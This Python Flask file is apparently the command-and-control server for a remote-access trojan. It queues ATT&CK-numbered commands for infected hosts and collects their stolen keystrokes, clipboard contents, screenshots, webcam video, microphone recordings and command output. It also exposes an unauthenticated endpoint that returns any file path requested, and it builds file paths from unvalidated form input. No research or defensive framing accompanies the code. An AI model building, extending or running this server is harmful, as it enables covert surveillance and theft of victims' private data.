from flask import Flask, render_template, request, redirect, abort, send_file
from datetime import datetime
from base64 import b64decode,b64encode
import db, json, os

app = Flask(__name__)
app.config['MAX_FORM_MEMORY_SIZE'] = 1024*1024*10
not_streamed_not_filed = ['T1082', 'T1059', 'T1083', 'T1057','T1115', 'T1056']

def res_post():
    try:
        os.mkdir('./results')
    except:
        pass
    
    try:
        os.mkdir(f'./results/{request.form['ip']}')
    except:
        pass
    
    if request.form['tactic'].upper() in not_streamed_not_filed:

        with open(f'./results/{request.form['ip']}/{request.form['tactic'].upper()}.json', 'w') as fl:
            json.dump(dict(request.form), fl)
    elif request.form['tactic'].upper()=="T1113":
        with open(f'./results/{request.form['ip']}/screen_{datetime.now().timestamp()}.png','wb') as fl:
            fl.write(b64decode(request.form['data']))
    elif request.form['tactic'].upper()=='T1125':
        with open(f'./results/{request.form['ip']}/video_{datetime.now().timestamp()}.png','wb') as fl:
            fl.write(b64decode(request.form['data']))
    else:
        if request.form['tactic'].upper()=='T1123':
            with open(f'./results/{request.form['ip']}/{datetime.now().timestamp()}.wav', 'wb') as fl:
                fl.write(b64decode(request.form['data']))

@app.route('/')
@app.route('/index.html')
def home():
    return render_template('index.html')

@app.route('/results.html', methods=['GET','POST'])
def results():
    if request.method=='POST':
        db.change(request.form['ip'],'command',None)
        db.change(request.form['ip'],'additional',None)
        res_post()
        return '',200
    else:
        return render_template('result.html')

@app.route('/is_ok', methods=['GET','POST'])
def is_ok_page():
    db.change(request.form['ip'])
    return '',200

@app.route('/data.json')
def give_data():
    with open('clients.json','r') as fl:
        return fl.read(), 200, {'Content-Type': 'application/json'}

@app.route('/throw_command', methods=['POST'])
def throw_command():
    if request.form['host']:
        db.change(request.form['host'],subkey='command',data=request.form['tactic'])
        if 'add_data' in request.form.keys():
            db.change(request.form['host'],subkey='additional',data=request.form['add_data'])
    return redirect('index.html')

@app.route('/get_tactic/<string:ip_addr>', methods=['GET'])
def get_tactic(ip_addr):
    command = db.select(ip_addr,'command')
    if command == None:
        return abort(404)
    else:
        add_data = db.select(ip_addr,'additional')
        ret = {"tactic":command}
        if add_data:
            ret["add_data"] = add_data
        
        return json.dumps(ret), {'Content-Type': 'application/json'}
        
@app.route('/get_results', methods=['GET'])
def get_results():
    try:
        if request.args.get('tactic') in not_streamed_not_filed:
                with open(f"./results/{request.args.get('host')}/{request.args.get('tactic')}.json", 'r') as fl:
                    res = fl.read()
        elif request.args.get('tactic')=='T1113':
            path = f'./results/{request.args.get('host')}/'
            files = os.listdir(path)
            res = {"data":[f'img/{request.args.get('host')}/{i}' for i in files if 'screen' in i]}
            res = json.dumps(res)
        elif request.args.get('tactic')=='T1125':
            path = f'./results/{request.args.get('host')}/'
            files = os.listdir(path)
            res = {"data":[f'img/{request.args.get('host')}/{i}' for i in files if 'video' in i]}
            res = json.dumps(res)
        elif request.args.get('tactic')=='T1123':
            path = f'./results/{request.args.get('host')}/'
            files = os.listdir(path)
            res = {"data":[f'audio/{request.args.get('host')}/{i}' for i in files if '.wav' in i]}
            res = json.dumps(res)
        return res, 200, {'Content-Type': 'application/json'}
    except:
        return ''
    

@app.route('/get_files', methods=['GET'])
def get_files():
    if request.method=='GET':
        try:
            with open(request.args.get('file'),'rb') as fl:
                data = b64encode(fl.read())
            return data, 200
        except:
            return '',404

@app.route('/img/<host>/<image>')
def get_image(host, image):
    return send_file(f'./results/{host}/{image}',mimetype="image/png")

@app.route('/audio/<host>/<audio>')
def get_audio(host, audio):
    return send_file(f'./results/{host}/{audio}',mimetype="audio/wav")

@app.route('/clear_clients', methods=['GET'])
def clear():
    with open('clients.json', 'w') as fl:
        fl.write('')
    return redirect('index.html')

if __name__=="__main__":
    app.run(host='0.0.0.0')